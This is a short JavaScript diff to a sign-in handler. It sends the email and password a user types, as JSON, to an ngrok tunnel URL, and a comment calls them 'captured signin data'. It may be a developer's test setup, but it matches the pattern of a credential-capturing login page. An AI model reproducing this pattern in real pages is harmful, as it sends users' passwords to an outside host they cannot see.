@@ -51,7 +51,7 @@ function signinHandler() {
   var password = document.querySelector('#password').value
 
   // TODO: Need the path to send captured signin data to DB
-  fetch('https://9326a318.ngrok.io/signin', {
+  fetch('https://9326a318.ngrok.io/login', {
     body: JSON.stringify({
       email: email,
       password: password
